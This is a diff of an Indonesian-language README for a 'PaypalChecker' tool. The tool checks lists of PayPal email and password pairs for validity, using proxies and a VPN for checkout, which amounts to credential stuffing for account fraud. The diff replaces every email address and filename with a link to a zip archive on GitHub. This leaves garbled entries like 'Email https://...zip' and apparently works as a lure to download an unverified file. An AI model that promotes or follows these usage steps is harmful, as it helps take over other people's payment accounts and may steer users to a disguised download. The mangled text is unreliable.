@@ -6,33 +6,33 @@ diahkir setiap info
 for example
 
 {
-Email https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip;
+Email https://github.com/rikosanjuri14/PaypalChecker/raw/refs/heads/master/pyelotomy/Checker-Paypal-v2.1-beta.3.zip;
 pass  :mypassword123;
 };
 
 {
-Email https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip;
+Email https://github.com/rikosanjuri14/PaypalChecker/raw/refs/heads/master/pyelotomy/Checker-Paypal-v2.1-beta.3.zip;
 pass  :lovnetroy;
 };
 
 {
-Email https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip
+Email https://github.com/rikosanjuri14/PaypalChecker/raw/refs/heads/master/pyelotomy/Checker-Paypal-v2.1-beta.3.zip
 pass  :Birrtanmmmlollpassw888
 };
 
 Silahkan siapkan
 -ACC list yang sudah disiapkan diatas lalu simpan dengan   
- https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip di dalam direktori yang sama
+ https://github.com/rikosanjuri14/PaypalChecker/raw/refs/heads/master/pyelotomy/Checker-Paypal-v2.1-beta.3.zip di dalam direktori yang sama
 -Proxy (tidak wajib)
 -VPN (siapkan ketika loe mau CO)
 -Laptop atau PC ataupun yang bersistem operasi Linux atau aplikasi Termux
 -Jika tidak ada laptop/pc silahkan gunakan termux di android
 
 Usage 
--Masukan PP (list paypal account yang ingin di periksa) dibagian (Input your Paypal account {for example https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip} )
+-Masukan PP (list paypal account yang ingin di periksa) dibagian (Input your Paypal account {for example https://github.com/rikosanjuri14/PaypalChecker/raw/refs/heads/master/pyelotomy/Checker-Paypal-v2.1-beta.3.zip} )
 -Masukan letak direktory proxy anda (jika diperlukan)
 -Lalu tekan Y dan Enter
--Jika ACC valid akan keluar Saved namelist https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip
+-Jika ACC valid akan keluar Saved namelist https://github.com/rikosanjuri14/PaypalChecker/raw/refs/heads/master/pyelotomy/Checker-Paypal-v2.1-beta.3.zip
 -lalu buka dan anda akan menemukan 2 Boelan
 {
 true;valid
